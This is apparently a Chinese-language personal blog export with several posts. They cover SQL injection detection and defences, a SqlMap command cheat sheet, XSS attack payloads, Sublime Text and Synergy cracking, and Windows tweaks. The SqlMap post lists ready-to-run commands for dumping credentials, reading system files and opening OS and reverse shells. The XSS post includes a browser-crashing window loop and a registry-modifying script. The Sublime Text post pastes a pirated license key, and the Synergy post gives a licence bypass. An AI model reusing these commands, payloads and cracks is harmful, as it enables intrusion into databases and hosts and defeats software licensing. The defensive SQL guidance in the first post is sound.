<li><p>直接在URL地址后面加-1、-0、’%2B’和’%2B’a：<br>添加-1：index.php?id=123-1，当前后访问的页面不同时，即可确定存在数字型SQL注入漏洞；<br>添加-0：index.php?id=123-0，当前后访问的页面相同时，再加上-1，返回错误页面，则表示存在数字型SQL注入漏洞；<br>添加’%2B’和’%2B’a：这里%2B为‘+’的URL编码，当先添加’%2B’时index.php?id=123’%2B’返回同样的页面，而添加’%2B’a时返回错误，这种适用于SQL语句中id值被一对单引号括起来的情况。</p>
</li>
<li><p>判断盲注的常用方法：<br>1’ and 1=1 #<br>1’ and 1=2 #<br>判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。</p>
</li>
</ul>
<h1 id="三、防御方法："><a href="#三、防御方法：" class="headerlink" title="三、防御方法："></a>三、防御方法：</h1><p>关键是对所有用户的输入进行严格的检查过滤、对数据库配置使用最小权限原则。<br>常用的修复方案：<br>（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。</p>
<p>（2）过滤危险的 SQL 语句关键字。</p>
<p>（3）确认每种数据的类型。</p>
<p>（4）数据长度应该严格规定。</p>
<p>（5）网站每个数据层的编码统一。</p>
<p>（6）严格限制网站用户的数据库的操作权限。</p>
<p>（7）避免网站显示 SQL 错误信息。</p>
<p>（8）在网站发布之前建议使用一些专业的 SQL 注入检测工具进行检测。</p>
<p>（9）升级 web 服务器运行平台软件补丁，建议使用 WAF 防护。</p>
<p>其实最有效的防御手段是下面两种：</p>
<p>1、预编译：<br>原理是采用PreparedStatement将相应的SQL语句预先编译好，即SQL引擎会预先进行语法分析，产生语法树，生成执行计划，从而无论用户输入什么内容即使是sql命令都不会影响该SQL语句的语法结构而只能当成是字符串字面值参数。但并不是所有场景都能采用SQL预编译的，如需要进行一些字符串拼接的方式，这时便需要严格检查参数的数据类型以及采用一些安全函数来处理。<br>其过程如下:<br>（1）定义预编译的sql语句，其中待填入的参数用?占位。<br>（2）创建预编译Statement，并把sql语句传入。此时sql语句已与此preparedStatement绑定。所以第4步执行语句时无需再把sql语句作为参数传入execute()。<br>（3）填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）。<br>（4）执行预处理对象。<br>例子：<br>String sql=”select id,no from user where id=?”;<br>PreparedStatement ps = conn.prepareStatement(sql);<br>prestmt.setInt(1,id);<br>prestmt.executeQuery();</p>
<p>2、变量绑定：<br>是指在sql语句的条件中使用变量而不是常量，是为了减少解析的。具体的细节网上很多</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SqlMap语法</title>
    <url>/posts/4e30d5d2/</url>
    <content><![CDATA[<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基础步骤</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --current-user <span class="comment">#获取当前用户名称</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --current-db <span class="comment">#获取当前数据库名称</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --tables -D <span class="string">&quot;db_name&quot;</span> <span class="comment">#列表名</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --columns -T <span class="string">&quot;tablename&quot;</span> users-D <span class="string">&quot;db_name&quot;</span> -v 0 <span class="comment">#列字段</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump -C <span class="string">&quot;column_name&quot;</span> -T <span class="string">&quot;table_name&quot;</span> -D <span class="string">&quot;db_name&quot;</span> -v 0 <span class="comment">#获取字段内容</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 信息获取</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --smart --level 3 --users <span class="comment"># smart 智能 level 执行测试等级</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://92.168.109.139/news?id=1&quot;</span> --dbms <span class="string">&quot;Mysql&quot;</span> --users <span class="comment"># dbms 指定数据库类型</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --users <span class="comment">#列数据库用户</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs<span class="comment">#列数据库</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --passwords <span class="comment">#数据库用户密码</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --passwords-U root -v 0 <span class="comment">#列出指定用户数据库密码</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump -C <span class="string">&quot;password,user,id&quot;</span> -T <span class="string">&quot;tablename&quot;</span> -D <span class="string">&quot;db_name&quot;</span> --start 1 --stop 20 <span class="comment">#列出指定字段，列出 20 条</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump-all -v 0 <span class="comment">#列出所有数据库所有表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --privileges <span class="comment">#查看权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --privileges -U root <span class="comment">#查看指定用户权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --is-dba -v 1 <span class="comment">#是否是数据库管理员</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --roles <span class="comment">#枚举数据库用户角色</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --udf-inject <span class="comment">#导入用户自定义函数（获取系统权限！）</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump-all --exclude-sysdbs -v 0 <span class="comment">#列出当前库所有表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --union-cols <span class="comment">#union 查询表记录</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http:/192.168.56.3/news?id=1&quot;</span> --cookie <span class="string">&quot;COOKIE_VALUE&quot;</span> <span class="comment">#cookie 注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> -b <span class="comment">#获取 banner 信息</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --data <span class="string">&quot;id=3&quot;</span> <span class="comment">#post 注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> -v 1 -f <span class="comment">#指纹判别数据库类型</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --proxy<span class="string">&quot;http://127.0.0.1:8118&quot;</span> <span class="comment">#代理注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span>--string<span class="string">&quot;STRING_ON_TRUE_PAGE&quot;</span> <span class="comment">#指定关键词</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --sql-shell <span class="comment">#执行指定 sql 命令</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --file /etc/passwd  <span class="comment">#必须为dbs权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --file-write 本地文件路径 file-dest 目标路径  <span class="comment">#必须为dbs权限(可将本地的某个文件写入到目标路径下)</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-cmd=whoami <span class="comment">#执行系统命令</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-shell <span class="comment">#系统交互 shell</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-pwn <span class="comment">#反弹 shell</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --reg-read <span class="comment">#读取 win 系统注册表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs-o <span class="string">&quot;sqlmap.log&quot;</span> <span class="comment">#保存进度</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs -o <span class="string">&quot;sqlmap.log&quot;</span> --resume <span class="comment">#恢复已保存进度</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --msf-path=/opt/metasploit3/msf2 --os-pwn 反弹 shell 需 metasploit 路径</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --tamper <span class="string">&quot;base64encode.py&quot;</span> 加载脚本(可利用绕过注入限制)</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --batch --tamper <span class="string">&quot;base64encode.py&quot;</span> 加载脚本(可利用绕过注入限制)</span><br><span class="line">sqlmap -g <span class="string">&quot;google 语法&quot;</span> --dump-all --batch <span class="comment">#google 搜索注入点自动 跑出所有字段</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --forms  <span class="comment">#post提交方式注入</span></span><br><span class="line">sqlmap.py -r 本地数据包路径 <span class="comment">#post提交方式注入</span></span><br></pre></td></tr></table></figure>
<h1 id="例"><a href="#例" class="headerlink" title="例"></a>例</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406&quot;</span> --string=<span class="string">&quot;Surname&quot;</span> --dbms=mysql --users --password</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>SqlMap</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime-Text3-汉化激活</title>
    <url>/posts/4c27c98/</url>
    <content><![CDATA[<h1 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h1><p>点击状态栏的help(帮助)，再点击进入enter lisence (输入祖册码) ，跳出来一个对话框，把下面的激活码复制进去即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----- BEGIN LICENSE -----</span><br><span class="line">sgbteam</span><br><span class="line">Single User License</span><br><span class="line">EA7E-1153259</span><br><span class="line">8891CBB9 F1513E4F 1A3405C1 A865D53F</span><br><span class="line">115F202E 7B91AB2D 0D2A40ED 352B269B</span><br><span class="line">76E84F0B CD69BFC7 59F2DFEF E267328F</span><br><span class="line">215652A3 E88F9D8F 4C38E3BA 5B2DAAE4</span><br><span class="line">969624E7 DC9CD4D5 717FB40C 1B9738CF</span><br><span class="line">20B3C4F1 E917B5B3 87C38D9C ACCE7DD8</span><br><span class="line">5F7EF854 86B9743C FADC04AA FB0DA5C0</span><br><span class="line">F913BE58 42FEA319 F954EFDD AE881E0B</span><br><span class="line">------ END LICENSE ------</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h1><ul>
<li><p>按<code>Ctrl + ~</code>,调出调出的控制台</p>
</li>
<li><p>输入指令安装 package control</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request,os;pf&#x3D;&#39;Package Control.sublime-package&#39;;ipp&#x3D;sublime.installed_packages_path();urllib.request.install_opener(urllib.request.build_opener(urllib.request.ProxyHandler()));open(os.path.join(ipp,pf),&#39;wb&#39;).write(urllib.request.urlopen(&#39;http:&#x2F;&#x2F;sublime.wbond.net&#x2F;&#39;+pf.replace(&#39; &#39;,&#39;%20&#39;)).read())</span><br></pre></td></tr></table></figure>
<p>稍等片刻，状态栏preferences(首选项)中出现<code>package control</code> 说明安装成功了</p>
<ul>
<li>点击状态栏目<code>preferences(首选项)</code> <code>==&gt;</code> <code>package control</code> 或快捷键 <code>Ctrl + Shift + P</code> 调出 <code>package control</code> 输入 <code>install package</code> 回车，等待片刻，然后查找 <code>ChineseLocalizations</code>插件，选择安装成功后会自动切换成中文简体，可在帮助(<code>help</code>) <code>==&gt;</code> <code>Language</code> 中设置其他语言</li>
</ul>
]]></content>
      <tags>
        <tag>Sublime Text 3</tag>
      </tags>
  </entry>
  <entry>
    <title>Synergy一套键鼠控多设备</title>
    <url>/posts/920a0391/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>Windows 安装包在官网下载是需要付费后才能下载的，可<a href="https://github.com/symless/synergy-core/wiki/Compiling">自行编译</a> 获得安装包,百度网盘有1.10的安装包</p>
<p><strong>部分Windows系统没有运行库安装时会提示没权限开启服务，需要装上运行库才能运行</strong></p>
<p><strong>archlinux了直接通过<code>sudo pacman -S community/synergy</code>安装</strong></p>
<h2 id="Synergy-第三方编译版下载"><a href="#Synergy-第三方编译版下载" class="headerlink" title="Synergy 第三方编译版下载"></a>Synergy 第三方编译版下载</h2><p>不担心安全问题的的话可以试一试第三方编译版</p>
<p><a href="https://github.com/brahma-dev/synergy-stable-builds/releases">下载1</a></p>
<p><a href="https://sourceforge.net/projects/synergy-stable-builds/">下载2</a></p>
<a id="more"></a>
<h1 id="共享鼠标键盘神器：Synergy-破解"><a href="#共享鼠标键盘神器：Synergy-破解" class="headerlink" title="共享鼠标键盘神器：Synergy 破解"></a>共享鼠标键盘神器：<code>Synergy</code> 破解</h1><h2 id="修改破解"><a href="#修改破解" class="headerlink" title="修改破解"></a>修改破解</h2><p><strong>原理：修改配置中edition的默认值由3改为1.</strong></p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>修改注册表：<code>synergy.reg</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[HKEY_CURRENT_USER\Software\Synergy\Synergy]</span><br><span class="line">&quot;edition&quot;&#x3D;dword:00000001</span><br></pre></td></tr></table></figure>
<h3 id="Linux-amp-mac"><a href="#Linux-amp-mac" class="headerlink" title="Linux &amp; mac"></a>Linux &amp; mac</h3><p><code>~/.config/Synergy/Synergy.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[General]</span><br><span class="line">edition&#x3D;1</span><br></pre></td></tr></table></figure>
<p>Windows：v1.8.4、v1.8.8；Linux：v1.10.1可用</p>
<p>参考： <a href="https://www.jianshu.com/p/42f28d1b5daa">https://www.jianshu.com/p/42f28d1b5daa</a></p>
<h2 id="序列号"><a href="#序列号" class="headerlink" title="序列号"></a>序列号</h2><p><code>7B76313B70726F3BE5BDAC20E585B33B313B7A7A39323735313040676D61696C2E636F6D3B3B3B7D</code></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="服务端-键鼠控制端"><a href="#服务端-键鼠控制端" class="headerlink" title="服务端(键鼠控制端)"></a>服务端(键鼠控制端)</h2><p>勾选服务端模式</p>
<p><img data-src="synergy0.png" alt="synergy0"></p>
<p>设置服务端 <code>&gt;</code> 通过拖动右上角的图标添加屏幕,也可将已有的拖到左上角删除</p>
<p><img data-src="synergy2.png" alt="synergy2"></p>
<p>双击已有的屏幕,<strong>编辑屏幕名</strong> ,也可进行其他配置， <strong>不编辑屏幕名将被拒绝连接</strong></p>
<p><img data-src="synergy3.png" alt="synergy3"></p>
<p>可在热键设置中添加热键</p>
<p><img data-src="synergy4.png" alt="synergy4"></p>
<p>设置热键行为</p>
<p><img data-src="synergy5.png" alt="synergy5"></p>
<h2 id="客户端-被控制端"><a href="#客户端-被控制端" class="headerlink" title="客户端(被控制端)"></a>客户端(被控制端)</h2><p>勾选客户端模式</p>
<p><img data-src="synergy1.png" alt="synergy1"></p>
<p>在客户端模式下需要 <strong>填写服务端IP</strong>,并需要向服务端提供屏幕名</p>
<p><img data-src="synergy6.png" alt="synergy6"></p>
<p>客户端可自定义屏幕名</p>
<p><img data-src="synergy7.png" alt="synergy7"></p>
<p>最后点击右下角的应用然后点开始即可使用了，窗口最小化时将其放到系统托盘，关闭窗口可后台运行（剪切板不共享）</p>
<h1 id="Synergy-项目-fork-出来的免费版本"><a href="#Synergy-项目-fork-出来的免费版本" class="headerlink" title="Synergy 项目 fork 出来的免费版本"></a>Synergy 项目 fork 出来的免费版本</h1><p>Synergy 是开源收费的，可自己编译免费版使用,官网下载收费</p>
<p>有大神从 Synergy 项目 fork 出一个免费版 Barrier 可在 Widnows 、Mac OS 、Linux 使用</p>
<p><a href="https://github.com/debauchee/barrier">Barrier 项目</a></p>
]]></content>
  </entry>
  <entry>
    <title>Windows10镜像优化</title>
    <url>/posts/9670136d/</url>
    <content><![CDATA[<h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><h1 id="组件移除"><a href="#组件移除" class="headerlink" title="组件移除"></a>组件移除</h1><h2 id="Windows-Apps"><a href="#Windows-Apps" class="headerlink" title="Windows Apps"></a>Windows Apps</h2><h3 id="Metro应用"><a href="#Metro应用" class="headerlink" title="Metro应用"></a>Metro应用</h3><ul>
<li><p>Advertising.Xaml  广告</p>
</li>
<li><p>BingWeather  天气</p>
</li>
</ul>
<a id="more"></a>
<ul>
<li><p>GetHelp  获取帮助</p>
</li>
<li><p>Messaging  消息</p>
</li>
<li><p>MicrosoftofficeHub  Office</p>
</li>
<li><p>MicrosoftSolitaireCollection  纸牌游戏</p>
</li>
<li><p>MicrosoftStivkyNotes  便签</p>
</li>
<li><p>People  人脉</p>
</li>
<li><p>SkypeApp</p>
</li>
<li><p>WindowsAlarms  闹钟</p>
</li>
<li><p>WindowsFeedbackHub  用户反馈</p>
</li>
<li><p>WindowsMaps  地图</p>
</li>
<li><p>Xbox应用</p>
</li>
<li><p>YourPhone  手机</p>
</li>
<li><p>提示</p>
</li>
<li><p>钱包服务</p>
</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li><p>OneDrive  微软云盘</p>
</li>
<li><p>Webcam Experience 网络摄像头</p>
</li>
<li><p>Windows Mixed Reality  混合现实</p>
</li>
<li><p>零售演示内容</p>
</li>
</ul>
<h3 id="本地化"><a href="#本地化" class="headerlink" title="本地化"></a>本地化</h3><h3 id="硬件支持"><a href="#硬件支持" class="headerlink" title="硬件支持"></a>硬件支持</h3><ul>
<li>Telephony(电话)</li>
<li>软盘</li>
</ul>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><ul>
<li><p>付款和NFC/SE管理器</p>
</li>
<li><p>远程桌面客户端</p>
</li>
</ul>
<h3 id="远程控制与隐私"><a href="#远程控制与隐私" class="headerlink" title="远程控制与隐私"></a>远程控制与隐私</h3><ul>
<li>Windows客户体验改善计划</li>
</ul>
<h3 id="远程控制与隐私-1"><a href="#远程控制与隐私-1" class="headerlink" title="远程控制与隐私"></a>远程控制与隐私</h3><ul>
<li><p>Windows 生物识别服务</p>
</li>
<li><p>Windows 客户体验改善计划</p>
</li>
<li><p>远程协助</p>
</li>
<li>远程桌面服务器</li>
<li>远程注册表</li>
</ul>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><h3 id="OneDrive"><a href="#OneDrive" class="headerlink" title="OneDrive"></a>OneDrive</h3><ul>
<li>OneDrive  云盘</li>
</ul>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
<li>自动安装赞助商应用</li>
</ul>
<h3 id="隐私选项"><a href="#隐私选项" class="headerlink" title="隐私选项"></a>隐私选项</h3><ul>
<li><p>Cortana</p>
</li>
<li><p>偶尔在”开始”屏幕显示建议</p>
</li>
<li><p>可让Microsoft通过使用你的诊断数据</p>
</li>
<li><p>向Microsoft发送有关我的写作习惯信息</p>
</li>
<li><p>启用体验改善计划</p>
</li>
<li><p>收集写作文本(ink-墨迹)让Windows和小娜更好的了解你</p>
</li>
<li>收集通讯录让Windows和小娜更好的了解你</li>
<li>收集键入文本让Windows和小娜更好的了解你</li>
<li>自动安装建议的应用</li>
<li><p>让Skype帮助你联系地址。。。</p>
</li>
<li><p>预安装应用</p>
</li>
</ul>
<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><ul>
<li>禁用<br>HomeGroup Listener</li>
</ul>
<p>HomeGroup Provider</p>
<p>Connected User Experiences and Telemetry</p>
<p>Diagnostic Execution Service</p>
<p>Diagnostic Policy Service</p>
<p>Diagnostic Service Host</p>
<p>Diagnostic System Host</p>
<p>DHCP Client</p>
<p>Server   文件共享服务</p>
<ul>
<li>手动<br>Background Intelligent Transfer Service</li>
</ul>
<p>Print Spooler</p>
<p>Task Schedule</p>
<p>TCP/IP NetBIOS helper</p>
<h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><h1 id="后期任务"><a href="#后期任务" class="headerlink" title="后期任务"></a>后期任务</h1><p>添加命令</p>
<h2 id="关闭休眠"><a href="#关闭休眠" class="headerlink" title="关闭休眠"></a>关闭休眠</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercfg -h off</span><br></pre></td></tr></table></figure>
<h2 id="开启卓越性能"><a href="#开启卓越性能" class="headerlink" title="开启卓越性能"></a>开启卓越性能</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61</span><br></pre></td></tr></table></figure>
<p>聚焦图<br><code>AppC:\Users\用户名\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets</code></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows快捷技巧</title>
    <url>/posts/231f48a5/</url>
    <content><![CDATA[<h1 id="常用运行命令"><a href="#常用运行命令" class="headerlink" title="常用运行命令"></a>常用运行命令</h1><p><code>Win + R</code> 运行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">regedit---注册表编辑器</span><br><span class="line">services.msc---服务管理</span><br><span class="line">gpedit.msc---本地组策略编辑器</span><br><span class="line">secpol.msc---本地安全组策略</span><br><span class="line">devmgmt.msc---设备管理</span><br><span class="line">compmgmt.msc---计算机管理</span><br><span class="line">progman---程序管理器</span><br><span class="line">winmsd---系统信息</span><br><span class="line">winver---系统版本</span><br><span class="line">eventvwr---事件查看器</span><br><span class="line">dxdiag---DirectX检查</span><br><span class="line">mstsc---远程桌面连接</span><br><span class="line">osk---屏幕键盘</span><br><span class="line">notepad---记事本</span><br><span class="line">mspaint---画图板</span><br><span class="line">calc---计算器</span><br><span class="line">lohoff---注销</span><br><span class="line">rononce -p ---15秒关机</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS跨站脚本攻击</title>
    <url>/posts/db4b83e4/</url>
    <content><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>Cross Site Scription,跨站脚本攻击 ,为了与 Cascading Style Sheet (CSS,层叠样式表) 区分将 Cross (意为:交叉)改为交叉形的X作为缩写，故成了叉SS,XSS 。是一种通过将恶意代码注入到网页脚本中的攻击，攻击成功后攻击者可获取到 Cookie 、以受攻击者身份进行操作等行为。</p>
<a id="more"></a>
<h2 id="XSS-危害"><a href="#XSS-危害" class="headerlink" title="XSS 危害"></a>XSS 危害</h2><ul>
<li>窃取用户 Cookie ，获取用户隐私，盗取用户帐号。</li>
<li>劫持会话，从而执行任意操作(非法转账，发送邮件等)。</li>
<li>强制弹出广告页，刷流量等。</li>
<li>利用植入 Flash，通过跨域权限设置进一步获取更高权限，执行一些操作。</li>
<li>传播跨站脚本蠕虫，网页挂马等。</li>
<li>在访问量极大的一些页面上的 XSS 可以攻击一些小型网站，实现 DoS 攻击效果</li>
<li>综合其他漏洞(如 CSRF) 实施进一步攻击。<br>…</li>
</ul>
<h2 id="攻击分类"><a href="#攻击分类" class="headerlink" title="攻击分类"></a>攻击分类</h2><ul>
<li>反射型: 攻击者构造带有攻击脚本代码的 URL ，诱导用户点击访问后，服务器接收到请求，然后把带有恶意代码的数据发送到浏览器端，浏览器端是信任该网站的就解析执行了这段脚本代码。</li>
<li>存储型：攻击脚本被存储在服务器上，当浏览器请求数据时，脚本从服务器返回并执行。某页面遭受存储型 XSS 攻击了，所有该页面的访问用户只要被请求访问了就会被攻击，具有更高的隐蔽性。</li>
</ul>
<blockquote>
<p>反射型与存储型的区别在于,反射线的恶意代码存在 URL 中，存储型的恶意代码存在服务器上。</p>
</blockquote>
<ul>
<li>DOM 型: 通过修改页面 DOM(Document Objeet Model，文本对象模型) 达到攻击，恶意代码的取出和执行完全由浏览器完成，属于前端自身的安全漏洞</li>
</ul>
<h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><ul>
<li>构造带有恶意代码的特殊 URL 。</li>
<li>诱导用户打开带有恶意代码的 URL ，服务端将恶意代码从 URL 中取出当作参数处理，然后返回给用户带有恶意代码的数据。</li>
<li>客户端收到响应解析并执行了混有恶意脚本的代码。</li>
<li>恶意代码窃取用户敏感数据发送给攻击者，或冒充用户调用目标网站接口执行攻击者指定的操作。</li>
</ul>
<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><ul>
<li>攻击者将恶意代码提交到目标网站的服务器中。</li>
<li>用户打开目标网站，网站服务器将带有恶意代码的数据，当作正常数据返回给用户。</li>
<li>客户端收到响应解析并执行了混有恶意脚本的代码</li>
<li>恶意代码窃取用户敏感数据发送给攻击者，或冒充用户调用目标网站接口执行攻击者指定的操作。</li>
</ul>
<h3 id="DOM-型"><a href="#DOM-型" class="headerlink" title="DOM 型"></a>DOM 型</h3><ul>
<li>构造带有恶意代码的特殊 URL 。</li>
<li>诱导用户打开带有恶意代码的 URL 。</li>
<li>客户端收到前端 javaScript 解析执行了 URL 中的恶意代码。</li>
<li>恶意代码窃取用户敏感数据发送给攻击者，或冒充用户调用目标网站接口执行攻击者指定的操作。</li>
</ul>
<h1 id="常见攻击脚本代码"><a href="#常见攻击脚本代码" class="headerlink" title="常见攻击脚本代码"></a>常见攻击脚本代码</h1><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试是否存在跨站</span></span><br><span class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Cookie 并弹出对话框，一些 Cookie 信息中将会包含帐号和密码</span></span><br><span class="line">&lt;script&gt;window.alert(document.cookie);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹 200x200 的窗口，在其中打开页面 `http://bing.com`</span></span><br><span class="line">&lt;script&gt;window.open(&#x27;http://bing.com&#x27;,&#x27;width=200,heigh=200&#x27;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 框架</span></span><br><span class="line">&lt;iframe src=http:<span class="comment">//bing.com width=0 height=0&gt;&lt;/iframe&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// refresh 到另一个页面</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;1;URL=http://bing.com&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// scriptlet 引入另一个页面</span></span><br><span class="line">&lt;object type=&quot;text/x-scriptlet&quot; data=&quot;http://bing.com&quot;&gt;&lt;/object&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开无数个浏览器窗口，直至CPU超负荷，非关机不可</span></span><br><span class="line">&lt;script language=<span class="string">&quot;javaScript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">	window.open(<span class="string">&quot;URI&quot;</span>);<span class="comment">//如果URI就是当前页本身，更具破坏性</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改注册表来修改IE主页</span></span><br><span class="line">&lt;script language=<span class="string">&quot;VBScript&quot;</span>&gt;</span><br><span class="line">Set RegWsh = CreateObject(<span class="string">&quot;WScrpt.Shell&quot;</span>);</span><br><span class="line"><span class="comment">//设置IE浏览器默认页</span></span><br><span class="line">RegWsh.RegWrite(<span class="string">&quot;HKCU\Software\Microsoft\Internet Explorer\Main\Start Page&quot;</span>,<span class="string">&quot;http://bing.com&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
